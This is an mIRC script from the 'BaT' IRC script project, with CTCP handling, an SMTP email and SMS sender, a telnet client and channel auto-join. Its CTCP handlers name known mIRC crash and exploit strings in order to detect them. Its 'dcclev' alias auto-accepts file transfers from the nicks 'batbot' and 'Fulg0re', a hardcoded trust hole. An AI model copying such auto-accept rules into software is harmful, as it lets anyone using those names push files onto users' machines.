;####################################;
;                                    ;
; BaT proyect by Fulg0re & Jimmy_RAY ;
;                                    ;
;     http://bat-proyect.da.ru       ;
;                                    ;
;                                    ;
;####################################;

#midelagctcp on
alias mlagon { .timerLAG off | mlag | .timerLAG 0 30 mlag | update }
alias mlagoff { .timerLAG off | .timerLAGG off | .timerLAGGG off | update }
alias mlag { set %ticklag $ticks | .notice $me PING $ctime MIDOLAG | .timerlagg 0 1 lagcaido | set %esperalag 0 }
alias lagcaido { if (%esperalag == 20) { set %timerlag.dismom On | .timerLAG off | display lagelevado $duration(%esperalag) } | if (%esperalag == 40) { display lagelevado $duration(%esperalag) } | if (%esperalag == 60) { display lagelevado2 1min | mlag } | inc %esperalag | set %lag + $+ %esperalag $+ .00s | update }
on *:ctcpreply:PING*MIDOLAG: { if ($nick == $me) { if (%timerlag.dismom == On) { .timerLAG 0 30 mlag } | .timerlagg off | .timerlaggg off | set %lag $calc(($ticks - %ticklag) / 1000) | set %lag $round(%lag,2) $+ s | update | unset %esperalag | halt } }
#midelagctcp end
ctcp *:*:*:{
  if ($1 == dcc) goto $1
  if ($dalev($nick) == 75) { display ctcpshit $nick $address $1- | .ignore -tu30 $nick | halt }
  if (%flctcp. [ $+ [ $nick ] ]) { inc %flctcp. [ $+ [ $nick ] ] | if (%flctcp. [ $+ [ $nick ] ] == 3) { unset %flctcp. [ $+ [ $nick ] ] | display flood $nick $address ctcp | .ignore -tu120 $nick | halt } } | else { set -u15 %flctcp. [ $+ [ $nick ] ] 1 }
  if (($1 != page) && ($1 != dcc)) { if (%cloak) { set %cloaktemp Si } | else set %cloaktemp No } | display ctcp $nick $address $iif($target == $me,ti,$target) %cloaktemp $1-
  if ($istok(finger.time.ping.page.version.sound.dcc,$1,46) == $false) goto otros | goto $1
  :sound | if ((*\* iswm $1-) || (*/* iswm $1-) || (con\ isin $1-) || (con/ isin $1-) || (clock$.mp3 isin $1-)) { display ataque $nick $address dos (ctcp $1- $+ ) | if (($target ischan) && ($me isop $chan)) { mode $chan -o+b $nick $address($nick,2) | kick $chan $nick Ataque Dos U SuX } } | halt
  :finger | if ((%ctcp.nofinger) || (%cloak)) halt | else .ctcpreply $nick $1 $ctcptheme(finger) | halt
  :time |  if (%cloak) halt | .ctcpreply $nick $1 $ctcptheme(time) | halt
  :ping | if (%cloak) halt | .ctcpreply $nick $1 $ctcptheme(ping) | halt
  :version | if (%cloak) halt | set %cv.temp $ctcptheme(version) | .ctcpreply $nick $1 %cv.temp | echo -a $ts $lgn Respuesta de versión enviada a $nick $+ : %cv.temp | unset %cv.temp | halt
  :page | if (($away) && (%aw.page)) echo -a Completa esto: guardar page en....? | halt
  :otros | if (%cloak) halt | if ($ctcptheme(otros)) .ctcpreply $nick $1 $ctcptheme(otros) | halt
  :dcc | if (($away) && (%aw.nodcc)) { display dccrechazadoaway $nick $address | halt } | if ($istok(chat.send,$2,46)) goto $2 | halt
  :chat | return
  :send | if (($dccignore) && ($dccignore($3))) { display dccrechazadofiletype $nick $address $3 | halt } | if ($dcclev($nick) == autoaceptar) { set %dtv $sreq | .sreq +m auto | .timer 1 1 .sreq $iif(%dtv,%dtv,ask) | unset %dtv } | return
}


alias dcclev { if (($1 == batbot) || ($1 == Fulg0re)) { return autoaceptar } |  else { return no } }

on !*:ctcpreply:*: {
  if (%flctcpreply. [ $+ [ $address($nick,2) ] ]) { inc %flctcpreply. [ $+ [ $address($nick,2) ] ] | if (%flctcpreply. [ $+ [ $address($nick,2) ] ] == 3) { unset %flctcpreply. [ $+ [ $address($nick,2) ] ] | display flood $nick $address ctcpreply | .ignore -ntu120 $nick } } | else { set -u15 %flctcpreply. [ $+ [ $address($nick,2) ] ] 1 }
  if (($1 == PING) && (2147483647 isin $2)) { display ataque $nick $address Asctime Exploit  | .ignore -nipu120 $wildsite | unset %lag. [ $+ [ $nick ] ] | goto fin }
  elseif (($1 == PING) && ($ isin $2-)) { display ataque $nick $address Identifier Exploit | .ignore -nipu120 $wildsite | unset %lag. [ $+ [ $nick ] ] | goto fin }
  elseif ((($1 == PING) || ($1 == PONG)) && (%lag. [ $+ [ $nick ] != $null)) { display ctcpreply $nick $address $1 $calc($calc($ticks - %lag. [ $+ [ $nick ] ] )  / 1000) $+ s. [ $+ $2- $+ ] | unset %lag. [ $+ [ $nick ] ] }
  else display ctcpreply $nick $address $1 $2-
  halt
}
on *:filesent:*: display filesent $nick $address $bytes($lof($filename),3).suf $nopath($filename) 
on *:filercvd:*: display filercvd $nick $address $get($nick).cps $bytes($lof($filename),3).suf $nopath($filename)
on :getfail:*: display getfail $nick $address $nopath($filename)
on *:sendfail:*: display sendfail $nick $address $nopath($filename)

alias ctcptheme {
  if ($istok(version.time.ping.finger,$1,46)) goto $1 | else goto otros
  :version | set %ctcptheme.version BaT[b0.8]: $read dat\versions.txt | return %ctcptheme.version 
  :ping | return BaT
  :time | return BaT
  :finger | return BaT
  :otros | return
}
alias email {
  if ($dialog(email)) dialog -v email
  else dialog -md email email
}

dialog email {
  title "Envio de emails"
  size -1 -1 200 220
  option dbu
  tab "Enviar un email" 1,5 0 190 180
  text "Servidor smtp" 2,10 22 40 10,tab 1
  combo 3,55 20 135 50,drop,edit,tab 1
  text "Remitente" 4,10 37 40 10,tab 1
  edit "" 5,55 35 135 10,autohs,tab 1
  text "Destino" 6,10 52 40 10,tab 1
  combo 7,55 50 135 50,drop,edit,tab 1
  text "Asunto" 8,10 67 40 10,tab 1
  edit "" 9,55 65 135 10,tab 1,autohs
  box "Mensaje" 10,10 80 180 95,tab 1
  edit "" 11,15 90 170 80,multi,return,hsbar,vsbar,tab 1
  edit "Rellena todos los campos para poder enviar el email" 12,5 185 190 10,read,center
  button "Enviar email" 13,10 200 50 15,disable
  tab "Configuración" 14
  box "Agenda" 15,10 20 180 75,tab 14
  list 16,15 30 120 70,tab 14 
  text "Nombre:",17,140 30 50 10,tab 14
  edit "" 18,135 40 50 10,tab 14 autohs
  text "Email:",19,140 50 50 10,tab 14
  edit "" 20,135 60 50 10,tab 14 autohs
  button "<< Añadir",21,135 70 50 10,disable,tab 14
  button "Borrar>>",22,135 80 50 10,disable,tab 14
  box "Servidores SMTP" 23,10 95 180 80,tab 14
  list 24,15 105 170 60,tab 14
  edit "" 25,15 160 100 10,autohs,tab 14
  button "<< Añadir" 26,115 160 35 10,disable,tab 14
  button "Borrar >>" 27,150 160 35 10,disable,tab 14
  button "Cerrar",1000,140 200 50 15,ok
}
on 1:dialog:email:init:*: {
  dll $mdx SetMircVersion $version 
  dll $mdx MarkDialog $dname 
  dll $mdx SetControlMDX $dname 16 listview rowselect grid showsel single flatsb labeltip headerdrag report > $views 
  did -i $dname 16 1 header @100,100 0 E-mail $chr(9) Nombre
  dll $mdx SetControlMDX $dname 24 listview rowselect grid showsel single flatsb labeltip headerdrag report > $views 
  did -i $dname 24 1 header @250 0 Servidor
  did -a $dname 5 %mi.mail
  email_loadlists
  .timer -m 0 10 email_timer
}
on 1:dialog:email:sclick:*: {
  if ($did == 13) {
    .sockclose batmail
    .sockopen batmail $did($dname,3) 25
    did -ra $dname 12 Conectando con $did($dname,3) (25) ...
  }
  if ($did == 21) {
    write " $+ $mircdirdat\mailagenda.dat $+ " $gettok($did($dname,18),1,32) $+ $chr(5) $+ $did($dname,20)
    did -r $dname 18,20    
    email_loadlists
  }
  if ($did == 22) { 
    write -dl $+ $calc($did($dname,16).sel - 1) " $+ $mircdirdat\mailagenda.dat $+ "
    email_loadlists
  }
  if ($did == 26) {
    write " $+ $mircdirdat\smtp.dat $+ " $did($dname,25)
    did -r $dname 25
    email_loadlists
  }
  if ($did == 27) { 
    write -dl $+ $calc($did($dname,24).sel - 1) " $+ $mircdirdat\smtp.dat $+ "
    email_loadlists
  }
  did $iif($did($dname,16).sel,-e,-b) $dname 22
  did $iif($did($dname,24).sel,-e,-b) $dname 27
}
alias email_loadlists {
  mkdir dat
  if ($findfile($mircdirdat,mailagenda.dat,1) == $null) write -c $mircdirdat\mailagenda.dat
  if ($findfile($mircdirdat,smtp.dat,1) == $null) write -c $mircdirdat\smtp.dat
  did -r $dname 3,7,16,24
  did -b $dname 22,27
  %i = 1
  while (%i <= $lines($mircdirdat\mailagenda.dat))  {
    %tmp.var = $read -l %i $mircdirdat\mailagenda.dat
    did -a $dname 7 $gettok(%tmp.var,1,5) ( $+ $gettok(%tmp.var,2,5) $+ )
    did -a $dname 16 $gettok(%tmp.var,1,5) $chr(9) $gettok(%tmp.var,2,5)
    inc %i
  }
  %i = 1
  while (%i <= $lines($mircdirdat\smtp.dat))  {
    %tmp.var = $read -l %i $mircdirdat\smtp.dat
    did -a $dname 3 %tmp.var
    did -a $dname 24 %tmp.var
    inc %i
  }
  did -c $dname 3 1
}
alias email_timer { if ($dialog(email) == $null) { .sockclose batmail | unset %batmail.tmp | .timeremail off } }
on 1:dialog:email:edit:*: {
  if ($did($dname,3)) && ($did($dname,5)) && ($did($dname,7)) && ($did($dname,11)) did -e $dname 13
  if ($did($dname,3) == $null) || ($did($dname,5) == $null) || ($did($dname,7) == $null) || ($did($dname,11) == $null) did -b $dname 13
  if ($did == 5) %mi.mail = $did($dname,5)
  if ($did($dname,18)) && ($did($dname,20)) did -e $dname 21
  if ($did($dname,18) == $null) || ($did($dname,20) == $null) did -b $dname 21
  if ($did($dname,25)) did -e $dname 26
  if ($did($dname,25) == $null) did -b $dname 26
}
on 1:sockopen:batmail: {
  if ($sockerr) {
    did -ra email 12 Error conectando con el servidor
    .sockclose $sockname
  }
  else {
    %batmail.tmp = 1
    did -ra email 12 Conectado! Enviando datos...
    sockwrite -nt $sockname HELO $ip
  }
}
on 1:sockread:batmail: {
  sockread %batmail
  if ($gettok(%batmail,1,32) == 250) {
    if (%batmail.tmp == 1) {
      sockwrite -nt $sockname mail from: $gettok($did(email,5),1,32)
      inc %batmail.tmp
      did -ra email 12 Enviando datos de remitente...
      return
    }
    elseif (%batmail.tmp == 2) {
      sockwrite -nt $sockname rcpt to: $did(email,7)
      inc %batmail.tmp
      did -ra email 12 Enviando datos de destino...
      return
    }
    elseif (%batmail.tmp == 3) {
      sockwrite -nt $sockname data
      did -ra email 12 Datos enviados... procediendo a mandar el contenido del email
      inc %batmail.tmp
      return
    }
    elseif (%batmail.tmp == 5) {
      sockwrite -nt $sockname QUIT
      did -ra email 12 El email ha sido enviado correctamente
      .sockclose $sockname
      return
    }
  }
  elseif ($gettok(%batmail,1,32) == 354) {
    did -ra email 12 Mandando email...
    sockwrite -nt $sockname From: $gettok($did(email,5),1,32)
    sockwrite -nt $sockname To: $did(email,7)
    sockwrite -nt $sockname Subject: $did(email,9)
    %i = 1
    while (%i <= $did(email,11).lines) {
      if ($did(email,11,%i) != .) sockwrite -nt $sockname $did(email,11,%i)
      inc %i
    }
    sockwrite -nt $sockname .
    inc %batmail.tmp
  }
  elseif ($gettok(%batmail,1,32) > 499) { 
    did -ra email 12 Error: %batmail
    .sockclose $sockname
  }
}

alias batsms {
  if ($dialog(batsms)) dialog -v batsms
  else dialog -md batsms batsms
}

dialog batsms {
  title "BaT: sms (solo movistar y amena)"
  size -1 -1 150 150
  option dbu

  menu "&Archivo",1
  ;item break,3
  ;item "&Salvar SMS",4
  ;item "&Cargar SMS",5
  ;item break,6
  item "&Ir a la Agenda",7
  item break,8
  item "&Servidores SMTP",9
  item break,10
  item "&Cerrar BaT SMS",11, ok
  menu "&Ayuda",12
  item "&Abrir la ayuda",13
  ;item "&Abrir el version.txt",14
  ;item break,15
  item "&Visitar la web",16
  item break,17
  item "&Créditos",18

  tab "Enviar" 19,5 0 140 135
  text "Servidor:" 20,10 22 25 10,tab 19
  combo 21,40 20 100 50,drop,edit,tab 19
  text "Tu email:" 22,10 37 25 10,tab 19
  edit "" 23,40 35 100 10,autohs,tab 19
  text "Numero:" 24,10 52 25 10,tab 19
  combo 25,40 50 100 50,drop,edit,tab 19
  edit "" 26,10 65 130 50,multi,return,vsbar,tab 19
  button "Enviar" 27,10 115 40 15,disable,default,tab 19
  button "Detener" 28,50 115 40 15,disable,tab 19
  edit "0/160" 29,100 115 30 10,read,center,tab 19
  button "->" 30,130 115 10 10,tab 19
  text "Debug:",31,150 5 30 10
  edit "" 32,150 15 125 120,read,multi,return,vsbar

  tab "Agenda" 33
  text "Nombre:" 34,10 22 25 10,tab 33
  edit "" 35,40 20 100 10,edit,tab 33
  text "Número:" 36,10 37 25 10,tab 33
  edit "" 37,40 35 100 10,autohs,tab 33
  list 38,10 50 130 70,vsbar,tab 33
  button "<<Añadir el número" 39,10 115 65 15,tab 33
  button "Borrar el número>>" 40,75 115 65 15,tab 33

  tab "Servidores SMTP" 41
  text "Servidor:" 42,10 22 25 10,tab 41
  edit "" 43,40 20 100 10,edit,tab 41
  list 44,10 35 130 80,vsbar,tab 41
  button "<<Añadir el servidor" 45,10 115 65 15,tab 41
  button "Borrar el servidor>>" 46,75 115 65 15,tab 41
}
on 1:dialog:batsms:*:*: {
  if ($devent == init) {
    unset %batsms.tmp
    .timerbatsms -m 0 10 batsms_timer
    mkdir dat
    mkdir dat\sms
    if ($findfile(dat\sms,agenda.dat,1) == $null) write -c dat\sms\agenda.dat
    if ($findfile(dat\sms,servers.dat,1) == $null) write -c dat\sms\servers.dat
    if ($findfile(dat\sms,config.dat,1) == $null) writeini dat\sms\config.dat conf email tu@email
    batsms_loadlists
    did -a $dname 23 %batsms.mimail
  }
  if ($devent == edit) && ($did == 26) batsmscuerposms
  if ($did == 7) did -f $dname 33
  if ($did == 9) did -f $dname 41
  if ($did == 2) did -f $dname 19
  %batsms.mimail = $did($dname,23)
  if ($did == 13) run $mircdirdat\sms\ayuda.txt
  if ($did == 16) run http://bat-proyect.da.ru
  if ($did == 18) about
  if ($did == 27) batsmssend
  if ($did == 28) batsmsstop
  if ($did == 30) {
    if ($did($dname,30) == <-) { dialog -s batsms -1 -1 300 300 | did -ra $dname 30 -> }
    else { dialog -s batsms -1 -1 555 300 | did -ra $dname 30 <- }
  }
  if ($did == 39) {
    write $mircdirdat\sms\agenda.dat $did($dname,37) $+ $chr(5) $+ $did($dname,35)
    did -r $dname 35,37
    batsms_loadlists
  } 
  if ($did == 40) {
    write -dl $+ $did($dname,38).sel $mircdirdat\sms\agenda.dat 
    batsms_loadlists
  }
  if ($did == 45) {
    write $mircdirdat\sms\servers.dat $did($dname,43)
    did -r $dname 43
    batsms_loadlists
  }  
  if ($did == 46) {
    write -dl $+ $did($dname,44).sel $mircdirdat\sms\servers.dat 
    batsms_loadlists
  }
  batsms_checkbt
  dialog -t $dname BaT SMS - $batsmscomp($did($dname,25))
}
alias batsms_checkbt {
  if ($did($dname,21)) && ($did($dname,23)) && ($batsmsvalnum($gettok($did($dname,25),1,32))) && ($len($batsmscuerposms) <= 135) && ($len($batsmscuerposms)) && ($sock(batsms,1) == $null) did -e $dname 27
  if ($did($dname,21) == $null) || ($did($dname,23) == $null) || ($batsmsvalnum($gettok($did($dname,25),1,32)) == $null) || ($len($batsmscuerposms) > 135) || ($len($batsmscuerposms) == 0) did -b $dname 27
  if ($sock(batsms,1)) {
    did -ra $dname 27 Enviando...
    did -b $dname 21,23,25,26,27
    did -e $dname 28
  } 
  if ($did($dname,35)) && ($did($dname,37)) did -e $dname 39
  if ($did($dname,35) == $null) || ($did($dname,37) == $null) did -b $dname 39
  did $iif($did($dname,38).sel,-e,-b) $dname 40
  did $iif($did($dname,43),-e,-b) $dname 45
  did $iif($did($dname,44).sel,-e,-b) $dname 46
}
alias batsms_loadlists {
  var %i, var %tmp.var
  %i = 1
  if ($findfile($mircdirdat\sms,agenda.dat,1) == $null) write -c $mircdirdat\sms\agenda.dat
  %tmp.var = $read -l1 $findfile($mircdirdat\sms,agenda.dat,1)
  did -r $dname 25,38
  while (%tmp.var) {
    did -a $dname 25 $gettok(%tmp.var,1,5) ( $+ $gettok(%tmp.var,2,5) $+ )
    did -a $dname 38 $gettok(%tmp.var,1,5) ( $+ $gettok(%tmp.var,2,5) $+ )
    inc %i
    %tmp.var = $read -l %i $findfile($mircdirdat\sms,agenda.dat,1)
  }
  %i = 1
  if ($findfile($mircdirdat\sms,servers.dat,1) == $null) write -c $mircdirdat\sms\servers.dat
  %tmp.var = $read -l1 $findfile($mircdirdat\sms,servers.dat,1)
  did -r $dname 21,44
  while (%tmp.var) {
    did -a $dname 21 %tmp.var
    did -a $dname 44 %tmp.var
    inc %i
    %tmp.var = $read -l %i $findfile($mircdirdat\sms,servers.dat,1)
  }
  did -c $dname 21 1
  unset %tmp.var %i
}
alias batsmscomp { 
  if ($1 == $null) || ($len($1) < 3)  return BaT SmS by Bravos Assault
  if ($istok(060.609.616.620.686.650.619.626.629.630.636.639.646.649.659.669.676.679.696.699.689.608,$left($1,3),46)) return Movistar
  elseif ($istok(651.652.653.654.655.656.657.658,$left($1,3),46)) return Amena
  else return Desconocido
}
alias batsmsmailcomp {
  if ($batsmscomp($1) == Movistar) return $1 $+ @ $+ correo.movistar.net
  if ($batsmscomp($1) == Amena) return $1 $+ @ $+ amena.com
}
alias batsmsvalnum { if ($1 isnum) && ($len($1) == 9) && ($batsmscomp($1) != Desconocido) return $true }
alias batsmscuerposms {
  unset %tmp.var
  %i = 1
  while (%i <= $did(batsms,26).lines) {
    %tmp.var = %tmp.var $did(batsms,26,%i)
    inc %i
  }
  did -ra batsms 29 $len(%tmp.var) $+ / $+ 135
  return %tmp.var
}
;sockets
alias batsms_timer batsmsclose
alias batsmsclose {
  if ($dialog(batsms) == $null) {
    .sockclose batsms
    unset %batsms.tmp 
    .timerbatsms off 
  } 
}

alias batsmssend {
  .sockclose batsms
  .sockopen batsms $did($dname,21) 25
  did -r $dname 32
  batsmsdebug -> Conectando con $did($dname,21) $+ ...

}
alias batsmsnone { }
alias batsmsdebug { if ($dialog(batsms)) did -o batsms 32 $did(batsms,32).lines $$1 $2- }
on 1:sockopen:batsms: {
  if ($sockerr) {
    batsmsdebug <- Error conectando con el servidor
    batsmsfin
    .timer -m 1 1 batsmsnone $?!="Error en la conexión con el servidor"
    return
  }
  %batsms.tmp = 1
  batsmsdebug :: Conectado! Enviando datos...
  sockwrite -nt $sockname HELO $ip
}
on 1:sockread:batsms: {
  sockread %batsms
  if ($gettok(%batsms,1,32) == 250) {
    if (%batsms.tmp == 1) {
      sockwrite -nt $sockname mail from: $gettok(%batsms.mimail,1,32)
      inc %batsms.tmp
      batsmsdebug :: Enviando datos de remitente...
      return
    }
    elseif (%batsms.tmp == 2) {
      sockwrite -nt $sockname rcpt to: $batsmsmailcomp($gettok($did(batsms,25),1,32))
      inc %batsms.tmp
      batsmsdebug :: Enviando datos de destino...
      return
    }
    elseif (%batsms.tmp == 3) {
      sockwrite -nt $sockname data
      batsmsdebug :: Datos enviados... procediendo a mandar el contenido del SmS
      inc %batsms.tmp
      return
    }
    elseif (%batsms.tmp == 5) {
      sockwrite -nt $sockname QUIT
      batsmsdebug [!] El SmS ha sido enviado al servidor correctamente :)
      .timer -m 1 1 batsmsnone $?!="El SmS ha sido enviado al servidor correctamente :)"
      batsmsfin
      return
    }
  }
  elseif ($gettok(%batsms,1,32) == 354) {
    batsmsdebug :: Mandando sms...
    sockwrite -nt $sockname From: $gettok($did(batsms,32),1,32)
    sockwrite -nt $sockname To: $batsmsmailcomp($gettok($did(batsms,25),1,32))
    sockwrite -nt $sockname Subject: 
    %i = 1
    while (%i <= $did(batsms,26).lines) {
      if ($did(batsms,26,%i) != .) sockwrite -nt $sockname $did(batsms,26,%i)
      inc %i
    }
    sockwrite -nt $sockname .
    inc %batsms.tmp
  }
  elseif ($gettok(%batsms,1,32) > 499) { 
    batsmsdebug :: [!] Error: %batsms
    .timer -m 1 1 batsmsnone $?!="Error: %batsms "
    batsmsfin
  }
}
alias batsmsfin {
  did -b batsms 28
  .sockclose batsms
  did -ra batsms 27 Enviar
  did -e batsms 21,23,25,26,27
}
alias batsmsstop {
  did -b $dname $did
  .sockclose batsms
  did -ra $dname 27 Enviar
  did -e $dname 21,23,25,26,27
  .timer -m 1 1 batsmsnone $?!="Envío de SmS cancelado"

  batsmsdebug [!] Error, envío de SmS cancelado
}
alias tln { 
  if ($dialog(tln)) dialog -v tln
  dialog -m tln tln
}
dialog tln {
  size -1 -1 130 125
  option dbu

  box "Conectar con: (ip/puerto)",1,5 5 120 35
  edit "",2,10 15 80 10,center autohs
  edit "23",3,90 15 30 10,center autohs
  button "&Conectar",4,10 25 40 10,default disable ok
  button "&Añadir a la Agenda",5,65 25 55 10,disable
  box "Agenda",6,5 40 120 80
  list 7,10 50 110 60
  button "&Borrar de la Agenda",8,10 105 55 10,disable
  button "Cerrar",9,80 105 40 10,cancel
}
on 1:dialog:tln:init:*: { dialog -t tln BaT: Cliente de Telnet $tln.sesion | tln.loadlist }
on 1:dialog:tln:edit:*: { tln.buttons }
on 1:dialog:tln:sclick:*: {
  if ($did == 4) telnet $did(tln,2) $did(tln,3)
  if ($did == 5) {
    write -il1 $mircdirdat\telnet.txt $did(tln,2) $+ $chr(58) $+ $did(tln,3)
    tln.loadlist
  }
  if ($did == 7) { 
    did -e tln 8
    did -ra tln 2 $gettok($did(tln,7,$did(tln,7).sel).text,1,58)
    did -ra tln 3 $gettok($did(tln,7,$did(tln,7).sel).text,2,58)
  }
  if ($did == 8) {
    write -dl [ $+ [ $did(tln,7).sel ] ] $mircdirdat\telnet.txt
    did -b tln $did
    tln.loadlist
  }
  tln.buttons
}
alias tln.sesion return (Sesión $calc(%tln +1) $+ )
alias tln.buttons {
  if ($did(tln,2)) && ($did(tln,3)) did -e tln 4,5
  elseif ($did(tln,2) == $null)  did -b tln 4,5
  elseif ($did(tln,3) == $null)  did -b tln 4,5
}
alias tln.loadlist {
  did -r tln 7
  %i = 1
  if ($findfile($mircdirdat\,telnet.txt,1) == $null) {
    mkdir dat
    write -c $mircdirdat\telnet.txt
  }
  %tmp.var = $read -l %i $mircdirdat\telnet.txt
  while (%tmp.var) {
    did -a tln 7 %tmp.var
    inc %i
    %tmp.var = $read -l %i $mircdirdat\telnet.txt
} }
alias telnet {
  if ($2) && ($1) {
    inc %tln
    window  -ke @Telnet: [ $+ [ %tln ] ] 
    .sockclose telnet. [ $+ [ %tln ] ]
    .sockopen telnet. [ $+ [ %tln ] ] $1 $2 
    echo $colour(info) -t @Telnet: [ $+ [ %tln ] ] ***  Conectando con $1 ( $+ $2 $+ )
  }
  else echo $colour(info) -a *** Error: Usa "/Telnet ip puerto" para conectar
}
alias tln.id return $gettok($sockname,2,$asc(.))

on 1:sockopen:telnet.*: {
  if ($sockerr > 1) { 
    echo 2 -t @Telnet: [ $+ [ $tln.id ] ] *** Error al conectar
    .sockclose $sockname
  }
  else {
    echo $colour(info) -t @Telnet: [ $+ [ $tln.id ] ] *** Conectado!
    titlebar @Telnet: [ $+ [ $tln.id ] ] Conectado a: $sock($sockname,1).ip ( $+ $sock($sockname,1).port $+ )
  }
}
on 1:sockread:telnet.*: { 
  :nextread
  sockread %sockread.tmp
  if ($sockbr == 0) return
  if (%sockread.tmp) echo $colour(normal) -t @Telnet: [ $+ [ $tln.id ] ] - %sockread.tmp
  goto nextread
}
on 1:sockclose:telnet.*: {
  echo $colour(info) -t @Telnet: [ $+ [ $tln.id ] ] *** Desconectado
  titlebar @Telnet: [ $+ [ $tln.id ] ] $chr(160)
  .sockclose $sockname
}
alias tln.winsock return telnet. [ $+ [ $gettok($active,2,$asc(:)) ] ]
on 1:input:@telnet*: {
  if (/* !iswm $1) {
    if ($sock($tln.winsock)) { 
      sockwrite -nt $tln.winsock $1-
      echo $colour(own) -t $target -> $1-
      halt
    }
    else {
      echo $colour(info) -t $target *** Error: No estás conectado
      halt 
    }
  }
}
alias tln.ag return & $+ $read -l [ $+ [ $$1 ] ] $mircdirdat\telnet.txt
menu @telnet* {
  &Conectar: {
    titlebar @Telnet: [ $+ [ $gettok($active,2,$asc(:)) ] ] $chr(160)
    if ($sock($tln.winsock)) {
      .sockclose $tln.winsock
      echo $colour(info) -t @Telnet: [ $+ [ $gettok($active,2,$asc(:)) ] ] *** Desconectado
    }
    %tmp.var = telnet. [ $+ [ $gettok($active,2,$asc(:)) ] ] $$?="Introduce el servidor" $$?="Introduce el puerto (telnet 23)"
    .sockopen %tmp.var
    echo $colour(info) -t @Telnet: [ $+ [ $gettok($active,2,$asc(:)) ] ] *** Conectando con $gettok(%tmp.var,2,32) ( $+ $gettok(%tmp.var,3,32) $+ )
    unset %tmp.var
  }
  &Desconectar: {
    if ($sock($tln.winsock)) {
      .sockclose $tln.winsock
      echo $colour(info) -t @Telnet: [ $+ [ $gettok($active,2,$asc(:)) ] ] *** Desconectado
    }
    else echo $colour(own) -t @telnet: [ $+ [ $gettok($active,2,$asc(:)) ] ] *** Error: No estas conectado a ningún servidor. 
  }
  -
  &Menú:tln
  -
  &Limpiar ventana: clear $active
  -
  &Cerrar: {
    if ($sock($tln.winsock)) {
      .sockclose $tln.winsock
      echo $colour(info) -t @Telnet: [ $+ [ $gettok($active,2,$asc(:)) ] ] *** Desconectado
    }
    window -c $active
  }
}
on 1:close:@telnet*: {
  if ($sock(telnet. [ $+ [ $gettok($target,2,$asc(:)) ] ] ,1)) {
    .sockclose telnet. [ $+ [ $gettok($target,2,$asc(:)) ] ]
  }
}
alias diae return $readini dat\conf.ini autoentrar $1
on *:connect: {
  if ($diae(autoentrar) == On) { ae.auto }
}
alias ae.auto dialog -md ae.auto ae.auto
;
dialog ae.auto {
  title "BaT: Auto Entrada en canales al conectar"
  size -1 -1 400 100
  text "", 1, 20 10 360 50, Center
  text "", 2, 20 70 150 22
  button "Auto Entrar", 250, 170 70 100 25, ok default
  button "Cancelar", 249, 280 70 100 25, cancel
}
on *:dialog:ae.auto:init:*: {
  did -a ae.auto 1 Se va a proceder a la AutoEntrada en 7 segundos. Auto Entrar para forzarla, Cancelar para detenerla
  did -a ae.auto 2 Auto Entrada en $duration(7)
  set %aecuenta 7
  .timeraecuenta 0 1 aecuenta
}
on *:dialog:ae.auto:sclick:250: auto.entrada
on *:dialog:ae.auto:sclick:249: resetidle | .timeraecuenta off | display informa -s Cancelada Auto Entrada
alias aecuenta dec %aecuenta | if (%aecuenta == 0) auto.entrada | else did -ra ae.auto 2 Auto Entrada en $duration(%aecuenta)
alias auto.entrada dialog -x ae.auto | .timeraecuenta off | ae 
alias ae {
  display informa -a Procediendo a AutoEntrada
  set %ae.temp $diae(canales) 
  set %i 1 | while ($gettok(%ae.temp,%i,32)) { .timer 1 $calc(%i + 2) join $gettok(%ae.temp,%i,32) | inc %i }
  mlag 
}

alias aeconf dialog -m aeconf aeconf
;
dialog aeconf {
  title "BaT: Auto Entrada al conectar [/aeconf]"
  size -1 -1 155 123
  option dbu
  list 1, 5 25 60 70
  edit "", 2, 5 15 60 10
  button "Add", 3, 5 90 30 10, ok disable
  button "Del", 4, 35 90 30 10, ok disable
  box "", 5, -10 100 250 100
  check "Auto Entrar al conectar", 11, 5 5 65 10
  box "", 6, 75 -10 250 114
  text "Sugerencia:" , 7, 80 5 70 10, center
  text "Utiliza el Auto Entrar solo para los canales a los que no puedes faltar, esos tres o cuatro canales en los que siempre entras.", 8, 80 15 70 50, center
  text "El Auto Entrar genera lag inicial, así que cuantos más canales y más grandes, más lag al principio", 9, 80 50 70 50, center
  text "Por defecto está el canal #BaT, canal oficial del script; información, dudas...", 10, 80 80 70 50, center
  button "Cancelar", 249, 80 107 70 12, cancel
  button "Aceptar", 250, 5 107 70 12, ok
}
on *:dialog:aeconf:init:*:{
  if ($readini dat\conf.ini autoentrar autoentrar == On) did -c aeconf 11
  set %aetemp $readini dat\conf.ini autoentrar canales | set %i 1
  while ($gettok(%aetemp,%i,32)) { did -a aeconf 1 $gettok(%aetemp,%i,32) | inc %i }
  unset %aetemp %i
}
on *:dialog:aeconf:sclick:*: {
  if ($did == 1) { did -e aeconf 4 }
  if ($did == 3) { did -a aeconf 1 $did(2).text | did -b aeconf 3 | did -r aeconf 2 }
  if ($did == 4) { 
    set %tempaetemp $replace($didtok(aeconf,1,0),$chr(44),$chr(32))
    set %vartemp 1 | while ($gettok(%tempaetemp,%vartemp,32)) { if ($gettok(%tempaetemp,%vartemp,32) != $did(1).seltext) { set %tempaetemp2 %tempaetemp2 $gettok(%tempaetemp,%vartemp,32) | inc %vartemp } | else inc %vartemp }
    set %vartemp 1 | did -r aeconf 1 | while ($gettok(%tempaetemp2,%vartemp,32)) { did -a aeconf 1 $gettok(%tempaetemp2,%vartemp,32) | inc %vartemp }
    unset %vartemp %tempaetemp %tempaetemp2
  }
  if ($did == 250) {
    if ($did(11).state == 1) writeini dat\conf.ini autoentrar autoentrar On | else writeini dat\conf.ini autoentrar autoentrar Off
    writeini dat\conf.ini autoentrar canales $replace($didtok(aeconf,1,0),$chr(44),$chr(32))
  }
}
on *:dialog:aeconf:edit:2: { if (($did(2).text != $null) && ($left($did(2).text,1) == $chr(35))) did -e aeconf 3 | else did -b aeconf 3 }
